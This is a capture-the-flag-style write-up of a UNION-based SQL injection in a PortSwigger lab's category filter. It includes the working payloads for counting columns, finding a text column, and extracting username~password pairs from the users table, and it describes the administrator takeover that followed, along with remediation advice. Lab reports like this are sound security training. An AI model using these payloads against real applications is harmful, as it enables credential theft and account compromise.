# SQL Injection Vulnerability Report

## 1. Executive Summary

A SQL injection vulnerability was identified in the product category filtering functionality of the application.

The vulnerable `category` parameter allowed manipulation of the backend SQL query through a UNION-based SQL injection attack. The vulnerability was exploited to retrieve data from the `users` table.

Because only one output column was compatible with text, the `username` and `password` fields were concatenated into a single value. The extracted credentials were then used to authenticate as the `administrator` user.

The exploitation was successfully completed in the authorized PortSwigger Web Security Academy lab environment.

---

## 2. Vulnerability Classification

| Field                  | Details                                                        |
| ---------------------- | -------------------------------------------------------------- |
| Vulnerability          | SQL Injection                                                  |
| Injection Type         | UNION-based SQL Injection                                      |
| Affected Parameter     | `category`                                                     |
| Affected Functionality | Product category filter                                        |
| Target Table           | `users`                                                        |
| Sensitive Fields       | `username`, `password`                                         |
| Impact                 | Sensitive data disclosure and administrator account compromise |
| Testing Tool           | Burp Suite Professional                                        |
| Environment            | PortSwigger Web Security Academy                               |
| Status                 | Successfully Exploited                                         |

---

## 3. Affected Functionality

The vulnerable functionality was the product category filter.

The original request contained:

```http id="5m3j7v"
GET /filter?category=Accessories HTTP/2
```

The `category` parameter was identified as the injection point.

---

## 4. Technical Analysis

### 4.1 Column Enumeration

The first step was to determine the number of columns returned by the original SQL query.

Payload:

```sql id="k2v7qf"
' UNION SELECT NULL,NULL--
```

The query was accepted, establishing that the original query returned two columns.

### Result

```text id="c5n1py"
Number of columns: 2
```

---

### 4.2 Text-Compatible Column Identification

The columns were tested individually with a text value.

First test:

```sql id="s1f7cb"
' UNION SELECT 'abc',NULL--
```

This resulted in an internal server error.

Second test:

```sql id="0j7k5v"
' UNION SELECT NULL,'abc'--
```

This request was successful.

Therefore, the second column was identified as the text-compatible column.

### Result

```text id="4k6d8x"
Column 1 → Not text-compatible
Column 2 → Text-compatible
```

---

### 4.3 Cross-Table Data Retrieval

The lab database contained a separate table:

```text id="4g4wqt"
users
```

with:

```text id="a8t3xk"
username
password
```

The text-compatible column was used to retrieve both fields.

The values were concatenated using:

```sql id="7v8m1r"
username||'~'||password
```

The complete payload was:

```sql id="m6q4z2"
' UNION SELECT NULL,username||'~'||password FROM users--
```

The `~` character served as a delimiter between the username and password values.

---

## 5. Exploitation Result

The application response returned multiple records from the `users` table through the single text-compatible output column.

The response contained accounts including:

```text id="w4t9hx"
wiener
administrator
carlos
```

The actual credential values are intentionally excluded from this report to avoid publishing sensitive authentication information.

---

## 6. Authentication Impact

The extracted administrator credentials were used through the application's authentication functionality.

Authentication was successful.

The application confirmed the authenticated account as:

```text id="j6r2yp"
administrator
```

This demonstrated that the SQL injection could be escalated from database information disclosure to administrator account compromise.

---

## 7. Impact Assessment

Successful exploitation demonstrated the following security impacts:

### Confidentiality

An attacker could retrieve information from a database table that was not intended to be directly exposed through the affected functionality.

### Authentication

The vulnerability exposed authentication credentials stored in the database.

### Account Compromise

The extracted administrator credentials allowed authentication as a privileged application user.

### Potential Real-World Impact

In a real-world application, similar SQL injection could potentially allow an attacker to:

* Access sensitive database records.
* Extract authentication information.
* Compromise privileged accounts.
* Modify or delete database data, depending on database privileges.
* Potentially affect other application functionality.

---

## 8. Evidence

The following evidence was collected during testing:

### Evidence 01 — Lab Overview

```text id="5m2v9k"
screenshots/01-lab-overview.png
```

### Evidence 02 — Original Request

```text id="p8z4hc"
screenshots/02-original-request.png
```

### Evidence 03 — Column Count

```text id="v3k7nm"
screenshots/03-column-count.png
```

### Evidence 04 — Text-Compatible Column

```text id="q2f6sx"
screenshots/04-text-compatible-column.png
```

### Evidence 05 — Credential Extraction

```text id="j9w4rc"
screenshots/05-credential-extraction.png
```

### Evidence 06 — Successful Exploitation

```text id="n5x8qd"
screenshots/06-lab-solved.png
```

> Sensitive credential values should be redacted before publishing screenshots in a public repository.

---

## 9. Remediation

### Primary Remediation

The application should use parameterized queries or prepared statements for all SQL operations involving user-controlled input.

Instead of dynamically constructing SQL statements:

```text id="q8c2mr"
User Input
    ↓
String Concatenation
    ↓
SQL Query
```

the application should use:

```text id="t6v9pk"
User Input
    ↓
Parameterized Query
    ↓
Database
```

### Additional Security Controls

* Use prepared statements / parameterized queries.
* Never concatenate untrusted input into SQL statements.
* Implement appropriate server-side input validation.
* Apply least-privilege database permissions.
* Prevent detailed database errors from reaching users.
* Minimize sensitive data returned by application endpoints.
* Store passwords using strong, salted password hashing.
* Perform regular source-code security reviews.
* Include SQL injection tests in security regression testing.
* Conduct periodic authenticated and unauthenticated penetration testing.

---

## 10. Verification

The exploitation was verified by successfully authenticating as the `administrator` user.

The PortSwigger Web Security Academy lab subsequently displayed:

```text id="r3y7mw"
LAB — Solved
```

This confirms that the intended exploitation path was successfully completed.

---

## 11. Conclusion

The assessment demonstrated a complete UNION-based SQL injection attack against the application's product category filter.

The attack involved:

1. Identifying the SQL injection point.
2. Determining the number of columns.
3. Identifying the text-compatible column.
4. Accessing the `users` table.
5. Concatenating multiple database values into a single output column.
6. Extracting authentication credentials.
7. Authenticating as the administrator.
8. Confirming successful exploitation.

The vulnerability demonstrates the potentially severe impact of SQL injection when user-controlled input is incorporated directly into database queries.

The recommended primary remediation is the implementation of parameterized queries or prepared statements throughout the application's database access layer.

---

## 12. Testing Scope

Testing was performed exclusively against the intentionally vulnerable PortSwigger Web Security Academy laboratory environment.

No unauthorized third-party systems were targeted.
